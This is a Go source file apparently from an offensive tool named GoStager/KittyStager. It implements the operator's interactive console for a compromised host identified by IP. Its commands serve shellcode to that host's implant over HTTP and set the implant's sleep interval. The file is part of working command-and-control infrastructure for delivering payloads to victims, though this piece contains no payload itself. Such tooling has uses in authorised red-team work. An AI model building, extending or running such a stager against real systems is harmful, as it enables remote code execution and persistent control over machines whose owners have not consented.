package interact

import (
	"GoStager/cmd/http"
	"GoStager/cmd/util"
	"fmt"
	i "github.com/JoaoDanielRufino/go-input-autocomplete"
	"github.com/c-bata/go-prompt"
	color "github.com/logrusorgru/aurora"
	"os"
	"strconv"
	"strings"
)

func Interact(ip string) error {
	in := fmt.Sprintf("KittyStager - %s 🐈❯ ", ip)
	for {
		t := prompt.Input(in, completer)
		input := strings.Split(t, " ")
		switch input[0] {
		case "exit":
			os.Exit(1337)
		case "back":
			return nil
		case "shellcode":
			fmt.Printf("%s\n", color.Yellow("[*] Please enter the path to the shellcode"))
			var path string
			path, err := i.Read("Path: ")
			if err != nil {
				util.ErrPrint(err)
				break
			}
			err = http.HostShellcode(path, ip)
			if err != nil {
				return err
			}
		case "sleep":
			if len(input) != 2 {
				util.ErrPrint(fmt.Errorf("invalid input"))
				break
			}
			time, err := strconv.Atoi(input[1])
			if err != nil {
				util.ErrPrint(err)
				break
			}
			http.HostSleep(time, ip)
		}
	}
	return nil
}

func completer(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "exit", Description: "Exit the program"},
		{Text: "back", Description: "Go back to the main menu"},
		{Text: "shellcode", Description: "Host shellcode"},
		{Text: "sleep", Description: "Set sleep time"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}
